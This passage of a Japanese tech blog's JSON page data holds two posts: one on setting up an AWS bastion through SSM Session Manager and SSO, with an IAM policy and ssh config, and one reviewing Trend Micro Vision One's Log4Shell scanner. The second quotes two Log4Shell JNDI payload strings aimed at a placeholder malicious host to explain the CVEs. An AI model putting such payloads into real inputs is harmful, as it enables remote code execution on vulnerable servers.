ポリシー1を含んだロールを適用。なお、ECS ExecではSession Managerでポートフォワーディングを実現でき無かったことに加え、既存の踏み台資産を流用するため今回の実装対象から外しました。 \n\n  > SSOの設定SSOの設定 \n\n踏み台サーバーの設定が終わったら、次に当該インスタンスへ接続するためにSSOで渡すロールをアクセス権限セットに設定します。下記カスタムポリシーはEC2インスタンスにアクセスするための必要最低限のものになります。 カスタムポリシー json\n\n{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"cloudwatch:PutMetricData\", \"ds:CreateComputer\", \"ds:DescribeDirectories\", \"ec2:DescribeInstanceStatus\", \"logs:*\", \"ssm:*\", \"ec2messages:*\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"ssm:StartSession\" ], \"Resource\": [ \"arn:aws:ssm:*:*:session/<EC2インスタンスID>\", \"arn:aws:ec2:*:*:instance/<EC2インスタンスID>\" ] }, { \"Effect\": \"Deny\", \"Action\": [ \"ssm:Describe*\", \"ssm:Get*\", \"ssm:List*\", \"logs:Describe*\", \"logs:Get*\", \"logs:List*\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": \"iam:CreateServiceLinkedRole\", \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\", \"Condition\": { \"StringLike\": { \"iam:AWSServiceName\": \"ssm.amazonaws.com\" } } }, { \"Effect\": \"Allow\", \"Action\": \"iam:CreateServiceLinkedRole\", \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\", \"Condition\": { \"StringLike\": { \"iam:AWSServiceName\": \"ssm.amazonaws.com\" } } }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:DeleteServiceLinkedRole\", \"iam:GetServiceLinkedRoleDeletionStatus\" ], \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"ssmmessages:CreateControlChannel\", \"ssmmessages:CreateDataChannel\", \"ssmmessages:OpenControlChannel\", \"ssmmessages:OpenDataChannel\" ], \"Resource\": \"*\" } ] }    > セッションを張るための事前準備セッションを張るための事前準備 \n\nセッションを張るためには下記3つの手順が必要になります。SSO経由のセッション設定が2通りありますが、クレデンシャル方式はセッションが切れる毎に変更する手間があるため、CLI方式をお薦めします。 \n\n1. AWS CLI v2をインストール\n2. 下記いずれかの方式でSSO経由のセッション設定を行う クレデンシャル方式 CLI（ aws sso login ）方式 \n3. クレデンシャル方式\n4. CLI（ aws sso login ）方式\n5. Session Manager プラグインをインストール  > DBクライアントの設定DBクライアントの設定 \n\n最後に、DBクライアントについて3つの手順を踏んで接続を試みます2。なお、ローカル環境でポートフォワーディングを都度行うのを省略したい方は、DataGripを利用すると良いでしょう。 \n\n1. ローカル環境にて ~/.ssh/config ファイルを編集 Session Managerにproxyと対象RDSのエンドポイントを記載 configHost <任意のhost名> HostName <※ 指定しなければlocalhostになる> User ec2-user ProxyCommand sh -c \"aws ssm start-session --target <接続する踏み台のインスタンスID> --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region ap-northeast-1 --profile <プロフィール>\" LocalForward <任意のポート> <RDSエンドポイント>:<RDSポート> IdentityFile ~/.ssh/<EC2に接続する秘密鍵> 設定したhost名でセッションマネージャー越しにssh接続できるかを確認 sh$ ssh <設定したhost名> \n2. Session Managerにproxyと対象RDSのエンドポイントを記載 configHost <任意のhost名> HostName <※ 指定しなければlocalhostになる> User ec2-user ProxyCommand sh -c \"aws ssm start-session --target <接続する踏み台のインスタンスID> --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region ap-northeast-1 --profile <プロフィール>\" LocalForward <任意のポート> <RDSエンドポイント>:<RDSポート> IdentityFile ~/.ssh/<EC2に接続する秘密鍵> \n3. 設定したhost名でセッションマネージャー越しにssh接続できるかを確認 sh$ ssh <設定したhost名> \n4. 手順1で設定したsshで接続することでポートフォワーディング\n5. DBクライアントで下記のように接続情報を設定し接続する Host: <手順1のconfigファイルにて任意指定したホスト名> Port: <手順4のconfigファイルにて任意指定したポート> 他項目: DB接続情報 \n6. Host: <手順1のconfigファイルにて任意指定したホスト名>\n7. Port: <手順4のconfigファイルにて任意指定したポート>\n8. 他項目: DB接続情報  > WRAPUPWRAPUP \n\nパブリックサブネット上の踏み台に慣れている方は馴染みのない方法に戸惑うかも知れませんが、踏み台資産を流用できるという意味で導入のコストもそれほどかかりませんし、ユーザーとしても利用の敷居は高くありませんでした。後々の管理コストを心配している方は一度検討してみてはいかがでしょうか。  \n\n1. AmazonEC2RoleforSSM は非推奨のため適用しないように注意します。 ↩ \n2. 今回はメンテナンスコストを避けるためSSH over SSMの関連ツール ssh-ssm.sh ssm-tool は使わない方針でいます。 ↩"},"name":"[2021-11-21]踏み台をSSM Session ManagerとAWS SSOで実現する","tags":["session-manager","aws-sso"],"childPublishedDate":{"published_on":"2021-11-21T00:00:00.000Z","published_on_unix":1637452800}}},{"node":{"number":127,"relative_category":"blog/soc","fields":{"title":"Trend Micro Vision Oneを試してみる","excerpt":"11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM \n\n- 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） \n- JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）\n- JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046）  > SOLUTIONSOLUTION  \n\nFrom: Trend Micro\n Subject: Log4Shell診断ツール ご提供開始 \n\nApache Log4j2ログ出力ライブラリの複数のバージョンに影響を与える深刻な脆弱性情報が公開されています。当診断ツールは、Log4Shellの影響を受ける可能性のあるエンドポイントとWebアプリケーションを特定することができます。また、攻撃対象領域の詳細を即座に可視化し、リスクを軽減するための措置をご案内いたします。  \n\nと言うわけで、Trend Micro Vision Oneの一部機能が無償で提供されていたので確認します。Vision OneはSIEM、SOAR、EDR関連のツール。エンドポイント、サーバ、クラウド、メールおよびネットワーク全体を保護する各セキュリティ製品がセンサーとなり、各々のレイヤ―で検知した脅威や侵入の痕跡を、Threat Intelligenceを活用してサイバー攻撃の全体像を可視化します。  > Log4jShell診断ツールを試してみるLog4jShell診断ツールを試してみる \n\n1. Trend Micro Vision Oneにログイン\n2. [Log4Shell診断ツール]画面にてWindows/Mac/Linuxいずれかの診断ツールをダウンロード\n3. 1分ほどで端末にインストールされ、詳細が確認できる\n4. 自宅の端末で確認した結果はこちら \n5.  \n\nざっと試したところ数分程度でLog4Shellの診断を行う事ができました。Intune等EMMでの展開もそれほど難しくないように思います。  > 他の機能を確認他の機能を確認 \n\n先ほど試したLog4Shell診断ツールはTrend Micro Vision OneのAssessmentカテゴリのいち機能になります。Vision OneはSecurity Postureによる方針策定、Assessment・Thread Intelligenceによる脅威検出、XDR（EDR）による脅威応答、Zero Trust Secure Access・Mobile Securityによる脅威防御、Inventory Managementによる脅威特定から構成されています。  > Security PostureSecurity Posture \n\n各種リスク、脅威を表示することで、セキュリティに関する心構えとともに方針策定のヒントを提示します。    function description     Security Dashboard Company Risk Index、エンドポイントレポート、MITRE ATT&CK MATRIXマップ   Zero Trust Risk Insights アカウント侵害、脆弱性の検出、異常検出、クラウドアプリのアクティビティ、XDR検出、脅威検出     > AssessmentAssessment \n\n各種端末に対して脅威検出等のセキュリティ評価を行います。    function description     Targeted Attack Detection 標的型攻撃の検出   Security Assessment セキュリティ評価、Log4jの脆弱性検出     > Threat IntelligenceThreat Intelligence \n\n内部および外部ソースを元に分析を行い環境内の潜在的な脅威を特定します。    function description     Intelligence Reports 内部および外部のソースからの最新のインテリジェンスレポートを統合して、環境内の潜在的な脅威を特定   Suspicous Object Management 特定の疑わしいオブジェクトを検出した後に実行する接続製品のアクションを指定できます   Sandbox Analysis -     > XDR（EDR）XDR（EDR） \n\n検出モデルと応答サービスを管理します。    function description     Detection Model Management 検出モデルの管理   Workbench -   Observed Attack Techniques 観察された攻撃手法   Managed XDR マネージドXDRは検出および応答の代行サービス     > Zero Trust Secure AccessZero Trust Secure Access \n\n各種アクセス制御を管理します。    function description     Secure Access Overview -   Secure Access Rules IAM、ログイン制御   Access Control History -   Private Access Configuration プライベートアクセス制御   Internet Access Configuration インターネットアクセス制御     > Response ManagementResponse Management \n\n応答サービスを管理するものだと思いますが、XDR（EDR）との区別がよく分かりません。    function description     Response Management      > Mobile SecurityMobile Security \n\nモバイル端末に特化したセキュリティ機能、検出ログや管理ポリシーを扱います。EMM連携も可能です。    function description     Mobile Detection Logs モバイル端末検出ログ   Mobile Policy モバイル端末管理ポリシー   Risky Mobile Apps MDMとの統合機能     > Inventory ManagementInventory Management \n\n各種リソースの一覧表になります。    function description     Endpoint Inventory エンドポイント端末一覧表   Email Account Inventory Eメールアカウント一覧表   Network Inventory ネットワーク一覧表   Service Gateway Inventory サービスゲートウェイ一覧表   Mobile Inventory モバイル端末一覧表     > WRAPUPWRAPUP \n\nTrend Micro Vision Oneについて、各機能の使い勝手は分かりませんが、EDRを軸にセキュリティ機能を固めているようです。EDRについては完全自動化というのは無理でしょうから、どのくらいサポートがあるかで製品の価値がかわってくるものと思います。Log4Shell診断ツールの使い勝手は分かりましたが、コンソール画面上の他の機能を見る限りどの程度便利かはよく分かりませんでした。"},"name":"[2022-01-01]Trend Micro Vision Oneを試してみる","tags":["security","trend-micro-vision-one"],"childPublishedDate":{"published_on":"2022-01-01T00:00:00.000Z","published_on_unix":1640995200}}}]}},"pageContext":{"number":137}},"staticQueryHashes":[]}